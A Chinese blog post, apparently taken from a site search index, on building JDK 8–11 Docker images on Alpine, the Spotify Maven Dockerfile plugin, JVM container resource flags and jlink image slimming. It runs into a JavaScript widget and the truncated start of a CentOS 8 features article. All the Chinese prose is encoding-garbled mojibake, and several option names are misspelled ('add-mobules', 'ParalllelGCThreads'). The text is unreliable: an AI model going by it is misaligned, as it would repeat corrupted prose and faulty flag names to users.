æœˆä¹‹åæ‰èƒ½ç»§ç»­è·å¾— Java SE8 æ›´æ–°ã€‚Oracle å·²ç»å»ºè®®é€‰æ‹©ä¸è®¢é˜…æˆ–ä¸ç»§ç»­è®¢é˜…çš„å…¬å¸åœ¨è®¢é˜…ç»“æŸä¹‹å‰ï¼ŒæŠŠ JDK ç‰ˆæœ¬è¿ç§»åˆ° OpenJDKï¼Œä»¥ç¡®ä¿ç›¸å…³åº”ç”¨ç¨‹åºä¸å—å½±å“ã€‚ä¸‹è¿°çš„ JDK 8 ç‰ˆæœ¬é‡†ç”¨ Oracle çš„ server-jre-8ul72 ç‰ˆæœ¬ï¼Œè€Œå¯¹äº JDK 9ã€10 åŠ 11 ç‰ˆæœ¬ï¼Œåˆ™é‡†å– OpenJDK æ¥æ„å»ºã€‚é™„ä¸Š OpenJDK çš„å®˜æ–¹ä¸‹è½½åœ°å€ã€‚ 123456FROM registry.cn-hangzhou.aliyuncs.com/springcloud-cn/alpine-3.7:glibc-2.27-r0MAINTAINER example &lt;example@gmail.com&gt;ADD server-jre-8u172-linux-x64.tar.gz /opt/RUN chmod +x /opt/jdk1.8.0_172ENV JAVA_HOME=/opt/jdk1.8.0_172ENV PATH="$JAVA_HOME/bin:${PATH}" Alpine + glibc + JDK9123456FROM registry.cn-hangzhou.aliyuncs.com/springcloud-cn/alpine-3.7:glibc-2.27-r0MAINTAINER example &lt;example@gmail.com&gt;ADD openjdk-9u181_linux-x64_bin.tar.gz /opt/RUN chmod +x /opt/jdk-9ENV JAVA_HOME=/opt/jdk-9ENV PATH="$JAVA_HOME/bin:${PATH}" Alpine + glibc + JDK10123456FROM registry.cn-hangzhou.aliyuncs.com/springcloud-cn/alpine-3.7:glibc-2.27-r0MAINTAINER example &lt;example@gmail.com&gt;ADD openjdk-10.0.1_linux-x64_bin.tar.gz /opt/RUN chmod +x /opt/jdk-10.0.1ENV JAVA_HOME=/opt/jdk-10.0.1ENV PATH="$JAVA_HOME/bin:${PATH}" Alpine + glibc + JDK11123456FROM registry.cn-hangzhou.aliyuncs.com/springcloud-cn/alpine-3.7:glibc-2.27-r0MAINTAINER example &lt;example@gmail.com&gt;ADD openjdk-11+28_linux-x64_bin.tar.gz /opt/RUN chmod +x /opt/jdk-11ENV JAVA_HOME=/opt/jdk-11ENV PATH="$JAVA_HOME/bin:${PATH}" é˜¿é‡Œäº‘ä¸Šæœ‰å·²æ„å»ºå¥½çš„ä¸åŒç‰ˆæœ¬çš„ JDK é•œåƒï¼Œæ‹‰å–åˆ°æœ¬åœ°å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼š 1234567891011# åŸºäº Oracle JDK 8 æ„å»ºçš„é•œåƒ# docker pull registry.cn-hangzhou.aliyuncs.com/springcloud-cn/java:8u172-jre-alpine# åŸºäº OpenJDK 9 æ„å»ºçš„é•œåƒ# docker pull registry.cn-hangzhou.aliyuncs.com/springcloud-cn/java:openjdk-9u181-alpine# åŸºäº OpenJDK 10 æ„å»ºçš„é•œåƒ# docker pull registry.cn-hangzhou.aliyuncs.com/springcloud-cn/java:openjdk-10.0.1-alpine# åŸºäº OpenJDK 11 æ„å»ºçš„é•œåƒ# docker pull registry.cn-hangzhou.aliyuncs.com/springcloud-cn/java:openjdk-11-ea19-alpine Maven æ„å»ºä¸å‘å¸ƒé•œåƒæ„å»ºé•œåƒçš„ Maven æ’ä»¶ä¸»æµçš„å‡ æ¬¾ Docker çš„ Maven æ’ä»¶ï¼š è¿™é‡Œä»¥ Maven æ„å»ºä¸ºä¾‹ï¼Œé€‰ç”¨çš„æ˜¯ com.spotify çš„æ’ä»¶ï¼Œå…¶ Maven çš„ POM é…ç½®å¦‚ä¸‹ã€‚ä½¿ç”¨ spring-boot-maven-plugin çš„ 1.4.3 ç‰ˆæœ¬ï¼Œå¦å¤–è®¾ç½®çš„é•œåƒå‰ç¼€ä¸º registry.cn-hangzhou.aliyuncs.com/springcloud-cnï¼Œtag ä¸º $(project.version)ï¼Œ repositoryï¼ˆç§æœ‰ä»“åº“åœ°å€ï¼‰ä¸º ${docker.image.prefix}/${project.artifactId}ï¼Œå¦å¤–è¿™é‡Œè¿˜ä¼ é€’äº†ä¸€ä¸ª Docker çš„ buildArg ä¸º JAR_FILEï¼Œå…¶å€¼ä¸º $(project.build.finalName) .jarã€‚username ä¸ password æ ‡ç­¾æ˜¯æŒ‡è®¿é—®ç§æœ‰ä»“åº“çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œè‹¥ä¸éœ€è¦èº«ä»½è®¤è¯ï¼Œåˆ™å¯ä»¥æ³¨é‡Šè¿™ä¸¤ä¸ªæ ‡ç­¾ã€‚ç‚¹å‡»ä¸‹è½½å®Œæ•´çš„ç¤ºä¾‹ä»£ç ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;dockerfile.maven.version&gt;1.4.3&lt;/dockerfile.maven.version&gt; &lt;docker.image.prefix&gt;registry.cn-hangzhou.aliyuncs.com/springcloud-cn&lt;/docker.image.prefix&gt;&lt;/properties&gt;&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt;&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;com.spotify&lt;/groupId&gt; &lt;artifactId&gt;dockerfile-maven-plugin&lt;/artifactId&gt; &lt;version&gt;${dockerfile.maven.version}&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;default&lt;/id&gt; &lt;goals&gt; &lt;goal&gt;build&lt;/goal&gt; &lt;goal&gt;push&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;configuration&gt; &lt;skipPush&gt;true&lt;/skipPush&gt; &lt;!-- &lt;username&gt;admin&lt;/username&gt; --&gt; &lt;!-- &lt;password&gt;123456&lt;/password&gt; --&gt; &lt;repository&gt;${docker.image.prefix}/${project.artifactId}&lt;/repository&gt; &lt;tag&gt;${project.version}&lt;/tag&gt; &lt;buildArgs&gt; &lt;JAR_FILE&gt;${project.build.finalName}.jar&lt;/JAR_FILE&gt; &lt;/buildArgs&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; Maven æ„å»ºé•œåƒçš„ DockFileMaven é¡¹ç›®çš„ DockerFile å†…å®¹å¦‚ä¸‹ï¼Œç‰¹åˆ«æ³¨æ„ï¼ŒDockerFile éœ€è¦æ”¾åœ¨ IDEA é‡Œçš„æŸä¸ªåº”ç”¨ï¼ˆæ¨¡å—ï¼‰çš„æ ¹ç›®å½•ä¸‹ã€‚ä¾‹å¦‚ gateway-server æ¨¡å—éœ€è¦æ‰“åŒ…ï¼Œå¹¶å‘å¸ƒæ„å»ºåˆ° Docker é•œåƒé‡Œï¼Œé‚£ä¹ˆ DockerFile æ­¤æ—¶åº”è¯¥æ”¾åœ¨ gateway-server æ¨¡å—çš„æ ¹ç›®å½•ä¸‹ï¼Œä¸åŒçš„åº”ç”¨ï¼ˆæ¨¡å—ï¼‰å¯ä»¥æ‹¥æœ‰è‡ªå·±çš„ DockerFileã€‚ä¸‹é¢çš„ registry.cn-hangzhou.aliyuncs.com/springcloud-cn/java:8u172-jre-alpine æ˜¯æŒ‡ç§æœ‰ä»“åº“é‡Œå·²æ„å»ºå¥½çš„ JDK é•œåƒã€‚ 123456FROM registry.cn-hangzhou.aliyuncs.com/springcloud-cn/java:8u172-jre-alpineARG JAR_FILEENV PROFILE defaultADD target/${JAR_FILE} /opt/app.jarEXPOSE 8080ENTRYPOINT java ${JAVA_OPTS} -Djava.security.egd=file:/dev/./urandom -Duser.timezone=Asia/Shanghai -Dfile.encoding=UTF-8 -Dspring.profiles.active=${PROFILE} -jar /opt/app.jar Maven æ‰“åŒ…æ„å»ºé•œåƒæ‰§è¡Œä¸‹è¿°çš„ Maven æ‰“åŒ…æ„å»ºå‘½ä»¤ï¼ˆè·³è¿‡å•å…ƒæµ‹è¯•ï¼‰ï¼ŒæˆåŠŸåä¼šåœ¨æœ¬åœ°æ„å»ºç”Ÿæˆæ–°çš„ Docker é•œåƒï¼Œå¦‚æœä¸Šé¢çš„ POM é…ç½®äº† &lt;skipPush&gt;false&lt;/skipPush&gt;ï¼Œä¼šè‡ªåŠ¨å°†æ–°çš„é•œåƒ Push åˆ°ç§æœ‰ä»“åº“ã€‚ 1$ mvn clean package -Dmaven.test.skip=true Maven Push é•œåƒMaven æ‰‹åŠ¨ Push é•œåƒåˆ° ç§æœ‰ä»“åº“ï¼š 12345# ç¬¬ä¸€ç§æ–¹å¼ï¼šä¸ä½¿ç”¨èº«ä»½è®¤è¯æˆ–è€…ä½¿ç”¨POMé…ç½®é‡Œçš„ç§æœ‰ä»“åº“è´¦å·è¿›è¡ŒPush$ mvn dockerfile:push# ç¬¬äºŒç§æ–¹å¼ï¼šä½¿ç”¨æŒ‡å®šçš„ç§æœ‰ä»“åº“è´¦å·è¿›è¡ŒPush$ mvn dockerfile:push -Ddockerfile.username=xxx -Ddockerfile.password=xxx Maven è¿è¡Œé•œåƒæ‰§è¡Œä»¥ä¸‹å‘½ä»¤è¿è¡Œé•œåƒï¼Œå®é™…é¡¹ç›®ä¸­å¯ä»¥æ ¹æ®é¡¹ç›®éœ€è¦è°ƒæ•´å¯¹åº”çš„ JVM å‚æ•°ï¼š 1234# docker run -p 8080:8080 --rm \\-e JAVA_OPTS=\'-server -Xmx1g -Xms1g -XX:MetaspaceSize=64m -verbose:gc -verbose:sizes -XX:+UseG1GC -XX:MaxGCPauseMillis=50 -XX:+UnlockDiagnosticVMOptions -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/ -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:+PrintGCDateStamps -XX:+PrintTenuringDistribution -Xloggc:/opt/gc.log -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=5 -XX:GCLogFileSize=20M -Djava.io.tmpdir=/tmp\' \\-e PROFILE=\'default\' \\registry.cn-hangzhou.aliyuncs.com/springcloud-cn/gateway:1.0-SNAPSHOT JDK 8+ çš„ Docker èµ„æºé™åˆ¶æ”¯æŒJDK 8 &amp;&amp; JDK 9Java 8ul31 åŠä»¥ä¸Šç‰ˆæœ¬å¼€å§‹æ”¯æŒäº† Docker çš„ CPU å’Œ Memory é™åˆ¶ã€‚å¯¹äº CPU çš„é™åˆ¶ï¼Œå¦‚æœ JVM æ²¡æœ‰æ˜¾å¼æŒ‡å®š -XXï¼š ParalllelGCThreads æˆ–è€… -XXï¼š CICompilerCountï¼Œé‚£ä¹ˆ JVM ä¼šä½¿ç”¨ Docker çš„ CPU é™åˆ¶ã€‚å¦‚æœ Docker æœ‰æŒ‡å®š CPU Limitï¼ŒJVM å‚æ•°ä¹Ÿæœ‰æŒ‡å®š -XXï¼š ParalllelGCThreads æˆ–è€… -XXï¼š CICompilerCountï¼Œé‚£ä¹ˆæœ€ç»ˆä»¥æŒ‡å®šçš„ JVM å‚æ•°ä¸ºå‡†ã€‚å¯¹äº Memory é™åˆ¶ï¼Œéœ€è¦åŠ ä¸Š -XXï¼š +UnlockExperimentalVMOptions å’Œ -XXï¼š +UseCGroupMemoryLimitForHeap æ‰èƒ½ä½¿å¾— Xmx æ„ŸçŸ¥ Docker çš„ Memory Limitã€‚ JDK 10JDK 10 ç‰ˆæœ¬åºŸå¼ƒäº† UseCGroupMemoryLimitForHeapï¼ŒåŒæ—¶æ–°å¼•å…¥äº†æ–°é…ç½® ActiveProcessorCountï¼Œå¯ä»¥ç”¨æ¥å¼ºåˆ¶æŒ‡å®š CPU çš„ä¸ªæ•°ã€‚ JDK 11JDK 11 æ­£å¼ç§»é™¤ UseCGroupMemoryLimitForHeapï¼ŒåŒæ—¶æ–°å¼•å…¥ UseContainerSupport é…ç½®ï¼Œé»˜è®¤ä¸º tureï¼Œå³é»˜è®¤æ”¯æŒ Docker çš„ CPU åŠ Memory é™åˆ¶ï¼Œä¹Ÿå¯ä»¥è®¾ç½®ä¸º false æ¥ç¦ç”¨å®¹å™¨æ”¯æŒã€‚ JDK 9+ é•œåƒä¼˜åŒ–JDK9 åŠä»¥ä¸Šçš„ç‰ˆæœ¬ä¸ä¹‹å‰çš„ç‰ˆæœ¬æœ‰ä¸€ä¸ªæ¯”è¾ƒå¤§çš„å˜åŠ¨ï¼Œå°±æ˜¯ JDK9 åŠä»¥ä¸Šçš„ç‰ˆæœ¬æ”¯æŒæ¨¡å—ç³»ç»Ÿ JPMSï¼ŒåŒæ—¶ JDK è‡ªèº«ä¹Ÿæ¨¡å—åŒ–äº†ï¼Œé‡Œé¢çš„ Modular Run-Time Images åŠŸèƒ½ç‰¹æ€§ä»¥åŠ jlink å·¥å…·å¯¹äºé•œåƒçš„ä¼˜åŒ–éå¸¸æœ‰å¸®åŠ©ï¼Œå¯æ ¹æ®æ‰€éœ€æ¨¡å—æ¥ç²¾ç®€ JDKã€‚ Jlink å·¥å…·Jlink å·¥å…·å¯ä»¥ç”¨æ¥å°†å·²æœ‰çš„ JDK æŒ‰æ‰€éœ€æ¨¡å—è¿›è¡Œä¼˜åŒ–ï¼Œå¹¶é‡æ–°ç»„è£…æˆä¸€ä¸ªè‡ªå®šä¹‰çš„ runtime imageï¼Œå…¶åŸºæœ¬è¯­æ³•å¦‚ä¸‹ï¼š jlink [options] --module-path modulepath --add-modules module [,module...] å…¶ä¸­ module-path å‚æ•°ç”¨äºæŒ‡å®šéœ€è¦ Jlink çš„ JDK çš„ jmods è·¯å¾„ï¼Œoptions çš„éƒ¨åˆ†å‚æ•°è¯´æ˜å¦‚ä¸‹ï¼š add-mobulesï¼Œç”¨æ¥æŒ‡å®šæ‰€éœ€è¦çš„æ¨¡å—åç§°ï¼Œæ¯”å¦‚ java.xml compressï¼Œç”¨æ¥æŒ‡å®šå‹ç¼©çº§åˆ«ï¼Œ0 ä¸ºä¸å‹ç¼©ï¼Œ1 ä¸ºå¸¸é‡å­—ç¬¦ä¸²å…±äº«ï¼Œ2 ä¸º Zip å‹ç¼© no-hreader-filesï¼Œè¡¨ç¤ºæ’é™¤æ‰ header æ–‡ä»¶ outputï¼ŒæŒ‡å®šè¾“å‡ºç²¾ç®€åçš„ JDK çš„æ–‡ä»¶å¤¹è·¯å¾„ Jlink ä½¿ç”¨æ¡ˆä¾‹åˆ›å»ºå¯¹åº” Dockerfileï¼Œé…ç½®å†…å®¹å¦‚ä¸‹ï¼Œå…¶ä¸­æŒ‡å®šäº†éœ€è¦ä¾èµ–çš„ JDK æ¨¡å—ï¼Œç›®çš„æ˜¯é€šè¿‡ Jlink ç”Ÿæˆç²¾ç®€çš„ JDKï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„ç¤ºä¾‹ä»£ç ã€‚ 1234567891011121314151617181920212223FROM registry.cn-hangzhou.aliyuncs.com/springcloud-cn/java:openjdk-10.0.1-alpine as packager# jlink toolRUN /opt/jdk-10.0.1/bin/jlink \\ --module-path /opt/jdk-10.0.1/jmods \\ --verbose \\ --add-modules java.base,java.logging,java.xml,jdk.unsupported,java.sql,java.desktop,java.management,java.naming,java.instrument,jdk.jstatd,jdk.jcmd,jdk.management \\ --compress 2 \\ --no-header-files \\ --output /opt/jdk-10-jlinked# copy jdk after jlinkFROM registry.cn-hangzhou.aliyuncs.com/springcloud-cn/alpine-3.7:glibc-2.27-r0COPY --from=packager /opt/jdk-10-jlinked /opt/jdk-10.0.1ENV JAVA_HOME=/opt/jdk-10.0.1ENV PATH=$JAVA_HOME/bin:$PATH# add application jarARG JAR_FILEENV PROFILE defaultADD target/${JAR_FILE} /opt/app.jarEXPOSE 8080ENTRYPOINT java ${JAVA_OPTS} -Djava.security.egd=file:/dev/./urandom -Duser.timezone=Asia/Shanghai -Dfile.encoding=UTF-8 -Dspring.profiles.active=${PROFILE} -jar /opt/app.jar é€šè¿‡ Maven æ‰“åŒ…æ„å»ºé•œåƒï¼š 1$ mvn clean package -Dmaven.test.skip=true æŸ¥çœ‹é•œåƒçš„å¤§å°ï¼Œå¯ä»¥å‘ç°ç²¾ç®€åçš„ JDK åŒ…æ‹¬ app.jarï¼Œæ€»å¤§å°åœ¨ 100M ä»¥å†…ï¼š 12# docker images |grep gatewaydocker images |grep gatewayregistry.cn-hangzhou.aliyuncs.com/springcloud-cn/gateway 1.0-SNAPSHOT 8f0c327e65a4 2 minutes ago 96MB è¿è¡Œé•œåƒï¼š 1234# docker run -p 8080:8080 --rm \\-e JAVA_OPTS=\'-server -XX:+UseG1GC -XX:MaxGCPauseMillis=50 -XX:+UnlockDiagnosticVMOptions -XX:+UnlockExperimentalVMOptions -XX:+UseCGroupMemoryLimitForHeap -XX:ActiveProcessorCount=1 -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/ -Xlog:age*,gc*=info:file=gc-%p-%t.log:time,tid,tags:filecount=5,filesize=10m -Djava.io.tmpdir=/tmp\' \\-e PROFILE=\'default\' \\registry.cn-hangzhou.aliyuncs.com/springcloud-cn/gateway:1.0-SNAPSHOT æŸ¥çœ‹ç²¾ç®€åçš„ JDK å¤§å°ï¼š 12345678910# è¿æ¥å®¹å™¨# docker exec -it dreamy_golick /bin/sh# æŸ¥çœ‹ç²¾ç®€åçš„JDKå¤§å°# du -sh /opt/jdk-10.0.1/53.5M /opt/jdk-10.0.1/# æŸ¥çœ‹åº”ç”¨JaråŒ…çš„å¤§å°# du -sh /opt/app.jar22.2M /opt/app.jar var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡ å®¹å™¨åŒ–"},{title:"Centos8 æ–°ç‰¹æ€§ä»‹ç»",url:"/posts/e460e49c.html",text:'å‰è¨€ CentOS 7 å°†åœ¨ 2024 å¹´ 6 æœˆ 30 æ—¥åœæ­¢æ”¯æŒã€‚ å‘å¸ƒæ—¶é—´ CentOS 8 åœ¨ 2019.9.25 æ­£å¼å‘å¸ƒï¼Œæä¾›äº†ä¸¤ä¸ªç‰ˆæœ¬ï¼Œåˆ†åˆ«æ˜¯ CentOS å’Œ CentOS Streamsï¼ŒLinux å†…æ ¸ç‰ˆæœ¬ä¸º 4.18ã€‚å…¶ä¸­ CentOS Stream æ˜¯ä¸€ä¸ªæ»šåŠ¨å‘å¸ƒçš„ Linux å‘è¡Œç‰ˆï¼Œå®ƒä»‹äº Fedora Linux çš„ä¸Šæ¸¸å¼€å‘å’Œ RHEL çš„ä¸‹æ¸¸å¼€å‘ä¹‹é—´è€Œå­˜åœ¨ã€‚å¯ä»¥æŠŠ CentOS Streams å½“æˆæ˜¯ç”¨æ¥ä½“éªŒæœ€æ–°çº¢å¸½ç³» Linux ç‰¹æ€§çš„ä¸€ä¸ªç‰ˆæœ¬ï¼Œè€Œæ— éœ€ç­‰å¤ªä¹…ã€‚CentOS 8 ä¸æ”¯æŒ åœ¨ CentOS 7 çš„åŸºç¡€ä¸Šè¿›è¡Œå¤§ç‰ˆæœ¬å‡çº§ï¼Œå› æ­¤ CentOS 8 åªæ”¯æŒå…¨æ–°å®‰è£…ã€‚æˆªæ­¢ 2020 å¹´ 12 æœˆ 9 æ—¥ï¼ŒCentOS å®˜æ–¹å›¢é˜Ÿæ­£å¼å®£å¸ƒ 2021 å¹´åå°†åœæ­¢æ›´æ–° CentOS 8ï¼Œè½¬è€Œå°†æ›´å¤šçš„ç²¾åŠ›æ”¾åœ¨ CentOS Stream ä¸Šï¼Œä¹Ÿå°±æ˜¯è¯´ä»¥åä¸ä¼šå†æœ‰ CentOS 9ã€CentOS 10ï¼Œä½† CentOS 7 çš„é•¿æœŸæŠ€æœ¯æ”¯æŒæ—¶é—´å°†ä¸ä¼šæ”¹å˜ï¼Œä¾æ—§ä¼šå»¶ç»­åˆ° 2024 å¹´ã€‚ è½¯ä»¶ä»“åº“ å¼•å…¥äº†ä¸¤ä¸ªæ–°çš„è½¯ä»¶ä»“åº“ï¼Œåˆ†åˆ«æ˜¯ BaseOS å’Œ AppStreamï¼Œå…¶ä¸­ BaseOS åŒ…å«æ‰€æœ‰åº•å±‚ OS åŒ…ï¼ŒAppStream åŒ…å«ä¸åº”ç”¨ç¨‹åºç›¸å…³çš„åŒ…ã€å¼€å‘å·¥å…·ã€æ•°æ®åº“å’Œå…¶ä»–åŒ…ã€‚æ¢å¥è¯è¯´ï¼ŒBaseOS ä»“åº“æ‹¥æœ‰ç»„æˆæ“ä½œç³»ç»Ÿæ ¸å¿ƒçš„ä¼ ç»Ÿ RPM åŒ…ã€‚ä¸€æ—¦ä½ æ›´æ–°äº†ç³»ç»Ÿï¼Œå®ƒä¼šè‡ªåŠ¨ä¸‹è½½å¹¶å®‰è£…è¿™äº›åŒ…çš„ä»»ä½•æ–°ç‰ˆæœ¬ã€‚ç„¶è€Œæœ‰æ—¶å€™ä½ å¯èƒ½ä¸æƒ³æ‰¹é‡å‡çº§è½¯ä»¶ï¼Œå› ä¸ºå®ƒå¯èƒ½ä¼šåœ¨ä½ å¸Œæœ›ä¿æŒç¨³å®šçš„ç¯å¢ƒä¸­å¯¼è‡´å…¼å®¹æ€§é—®é¢˜ï¼ˆä¾‹å¦‚åœ¨æµ‹è¯•ä»£ç æ—¶ï¼‰ã€‚AppStream æ˜¯å¯¹ä¼ ç»Ÿ rpm æ ¼å¼çš„å…¨æ–°æ‰©å±•ï¼Œä¸ºä¸€ä¸ªç»„ä»¶åŒæ—¶æä¾›å¤šä¸ªä¸»è¦ç‰ˆæœ¬ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæ–°çš„ CentOS 8 æ–°å¢äº† AppStream ä»“åº“ã€‚ è½¯ä»¶æ›´æ–° ä½¿ç”¨ YUM åŒ…ç®¡ç†å™¨ 4.0.4 ç‰ˆæœ¬ï¼Œè¯¥ç‰ˆæœ¬ç°åœ¨ä½¿ç”¨ DNF (Dandified YUM) æŠ€æœ¯ä½œä¸ºåç«¯ã€‚DNF æ˜¯æ–°ä¸€ä»£çš„ YUMï¼Œä¸” CentOS 8 å…è®¸åŒæ—¶ä½¿ç”¨è¿™ dnf å’Œ yum ä¸¤ç§å·¥å…·æ¥ç®¡ç†åŒ…ã€‚ä¸ DNF æŠ€æœ¯é›†æˆåï¼Œæé«˜äº†æ€§èƒ½ï¼Œå…·æœ‰å®šä¹‰è‰¯å¥½çš„ APIï¼Œå¹¶æ”¯æŒæ¨¡å—åŒ–å†…å®¹ã€äº‘åº”ç”¨ç¨‹åºæµã€å®¹å™¨å·¥ä½œè´Ÿè½½å’Œ CI/CDã€‚ Shell å’Œå‘½ä»¤è¡Œå·¥å…· æä¾›çš„ç‰ˆæœ¬æ§åˆ¶å·¥å…·ï¼ŒåŒ…æ‹¬ Git 2.18ï¼ŒMercurial 4.8 å’Œ Subversion 1.10ã€‚ åŠ¨æ€ç¼–ç¨‹è¯­è¨€ã€Web å’Œæ•°æ®åº“æœåŠ¡å™¨ Python 3.6 æ˜¯é»˜è®¤çš„ Python ç¯å¢ƒï¼Œæœ‰é™æ”¯æŒ Python 2.7ã€‚ Node.js æ˜¯åœ¨ CentOS 8 ä¸­æœ€æ–°åŒ…å«çš„ï¼Œå…¶ä»–åŠ¨æ€è¯­è¨€æ›´æ–°åŒ…æ‹¬: PHP 7.2ï¼ŒRuby 2.5ï¼ŒPerl 5.26ï¼ŒSWIG 3.0ã€‚ æä¾›çš„æ•°æ®åº“æœåŠ¡ï¼ŒåŒ…æ‹¬ MariaDB 10.3ï¼ŒMySQL 8.0ï¼ŒPostgreSQL 10ï¼ŒPostgreSQL 9.6ï¼ŒRedis 5ã€‚ æä¾› Apache 2.4 å’Œé¦–æ¬¡å¼•å…¥ Nginx 1.14ã€‚ å°† Squid ç‰ˆæœ¬å‡çº§åˆ° 4.4ï¼ŒåŒæ—¶ä¹Ÿé¦–æ¬¡æä¾› Varnish Cache 6.0ã€‚ ç¼–è¯‘å™¨å’Œå¼€å‘å·¥å…· GCC ç¼–è¯‘å™¨æ›´æ–°åˆ° 8.2 ç‰ˆæœ¬ï¼Œæ”¯æŒæ›´å¤š C++ æ ‡å‡†ï¼Œæ›´å¥½çš„ä¼˜åŒ–ä»¥åŠä»£ç å¢å¼ºæŠ€æœ¯ã€æå‡è­¦å‘Šå’Œç¡¬ä»¶ç‰¹æ€§æ”¯æŒã€‚ æ ¸å¿ƒæ”¯æŒ eBPF è°ƒè¯•çš„å·¥å…·åŒ…æ‹¬ BCCã€PCP å’Œ SystemTapã€‚ 2.28 ç‰ˆæœ¬ glibc åº“æ”¯æŒ Unicode 11ï¼Œæ›´æ–°çš„ Linux ç³»ç»Ÿè°ƒç”¨åŠŸèƒ½ä¸»è¦æå‡ DNS Stub Resolver å’Œé¢å¤–çš„å®‰å…¨åŠ å¼ºå’Œæ€§èƒ½ã€‚ æä¾› OpenJDK 11ã€OpenJDK 8ã€IcedTea-Web ä»¥åŠä¸åŒçš„ Java å·¥å…·ï¼Œå¦‚ Antã€Mavenã€å’Œ Scalaã€‚ æ¡Œé¢ç¯å¢ƒ GNOME Shell å‡çº§åˆ° 3.28ï¼ŒGNOME çš„ä¼šè¯å’Œæ˜¾ç¤ºç®¡ç†ä½¿ç”¨ Waylan ä½œä¸ºé»˜è®¤çš„æ˜¾ç¤ºæœåŠ¡å™¨ï¼Œè€Œ CentOS 7 é»˜è®¤çš„ X.Org Server ä¾ç„¶æ”¯æŒã€‚ å®‰è£…ç¨‹åºä»¥åŠé•œåƒçš„åˆ›å»º Anaconda å®‰è£…ç¨‹åºå¯ä½¿ç”¨ LUKS2 ç£ç›˜åŠ å¯†ï¼Œæ”¯æŒ NVDIMM è®¾å¤‡ã€‚ Image Builder å·¥å…·å¯ä»¥åˆ›å»ºä¸åŒæ ¼å¼çš„è‡ªå®šä¹‰ç³»ç»Ÿé•œåƒï¼ŒåŒ…æ‹¬æ»¡è¶³äº‘å¹³å°çš„å„ç§æ ¼å¼ã€‚ æ”¯æŒä½¿ç”¨ç¡¬ä»¶ç®¡ç†æ§åˆ¶å° HMC ä» DVD å®‰è£…ï¼ŒåŒæ—¶ä¹Ÿæä¾› IBM Z ä¸»æœºçš„ Support Element (SE) å†…æ ¸æ‰©å±• Berkeley Packet Filtering (eBPF) ç‰¹æ€§ä½¿å¾—ç”¨æˆ·ç©ºé—´çš„å„ä¸ªç‚¹ä¸Šé™„åŠ è‡ªå®šä¹‰ç¨‹åºï¼ŒåŒ…æ‹¬ (sockets, trace points, packet reception) ï¼Œç”¨äºæ¥æ”¶å’Œå¤„ç†æ•°æ®ï¼Œç›®å‰è¯¥ç‰¹æ€§è¿˜å¤„äºç‰¹æ€§é¢„è§ˆé˜¶æ®µ BPF Compiler Collection (BCC), è¿™æ˜¯ä¸€ä¸ªç”¨æ¥åˆ›å»ºé«˜æ•ˆå†…æ ¸è·Ÿè¸ªå’Œæ“ä½œçš„å·¥å…·ï¼Œç›®å‰å¤„äºæŠ€æœ¯é¢„è§ˆé˜¶æ®µ æ–‡ä»¶ç³»ç»Ÿå’Œå­˜å‚¨ LUKS version 2ï¼ˆLUKS2ï¼‰æ ¼å¼æ›¿ä»£èµ°è¿‡å»çš„ LUKS (LUKS1) æ ¼å¼ï¼Œdm-crypt å­ç³»ç»Ÿå’Œ cryptsetup å·¥å…·ç°åœ¨ä½¿ç”¨çš„æ˜¯ LUKS2 ä½œä¸ºé»˜è®¤çš„åŠ å¯†å·æ ¼å¼ã€‚ åŠ å¯†å®‰å…¨ é»˜è®¤çš„ç³»ç»Ÿçº§çš„åŠ å¯†ç­–ç•¥ç”¨äºé…ç½®æ ¸å¿ƒåŠ å¯†å­ç³»ç»Ÿï¼Œè¦†ç›– TLSã€IPsecã€SSHã€DNSSEC å’Œ Kerberos åè®®ã€‚å¢åŠ 